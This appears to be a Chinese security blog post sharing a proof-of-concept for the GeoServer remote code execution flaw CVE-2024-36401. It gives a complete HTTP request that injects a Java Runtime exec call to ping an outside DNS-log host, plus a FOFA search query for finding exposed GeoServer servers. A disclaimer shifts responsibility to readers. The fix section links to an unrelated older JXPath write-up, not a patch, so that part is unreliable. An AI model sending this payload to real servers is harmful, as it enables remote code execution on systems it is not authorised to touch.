#  GeoServer远程代码执行漏洞-CVE-2024-36401   
小白菜安全  小白菜安全   2024-07-03 18:54  
  
**免责声明**  
  
该公众号主要是分享互联网上公开的一些漏洞poc和工具，  
利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，本公众号及作者不为此承担任何责任，一旦造成后果请自行承担！如果本公众号分享导致的侵权行为请告知，我们会立即删除并道歉。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia1Au88bO1jFd8V3AmqMvsqEZUFalBicQwJaic1tesic3duRuGPPQ3E1vczEJ67UzoMicSWMZpKwRElxtA/640?wx_fmt=png "")  
  
**漏洞影响范围**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia1JW7cCaq0TjSONajbHWJ2ZSYUbot1ibofsZBCJhO0LhXibm2B2ROcBU7KFwV4WMgNry9EiasdwMGrfw/640?wx_fmt=png&from=appmsg "")  
#  漏洞复现  
  
**poc**  
```
POST /geoserver/wfs HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: close
Content-Length: 320

<wfs:GetPropertyValue service='WFS' version='2.0.0'
xmlns:topp='http://www.openplans.org/topp'
xmlns:fes='http://www.opengis.net/fes/2.0'
xmlns:wfs='http://www.opengis.net/wfs/2.0'
valueReference='exec(java.lang.Runtime.getRuntime(),"ping xxx.dnslog.cn")'>
<wfs:Query typeNames='topp:states'/>
</wfs:GetPropertyValue>
```  
  
出现如下数据代表漏洞存在：查看dnslog  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia1JW7cCaq0TjSONajbHWJ2ZCgp55N6IvEDYo9D5xIVRUAWgXnQ4RicZCjpUFbsUfxFxgNtKwS7upBg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia1JW7cCaq0TjSONajbHWJ2ZnSYjEeGy3pZF2KmyjgraBe9FXibPtopegvryXgLL72BhA06O81SARZw/640?wx_fmt=png&from=appmsg "")  
  
  
**修复建议**  
  
目前厂商已发布升级补丁以修复漏洞，补丁获取链接：  
  
1.  
https://hackinglab.cz/en/blog/remote-code-execution-in-jxpath-library-cve-2022-41852/  
#   
# 搜索语法  
  
**fofa:app="GeoServer"**  
  
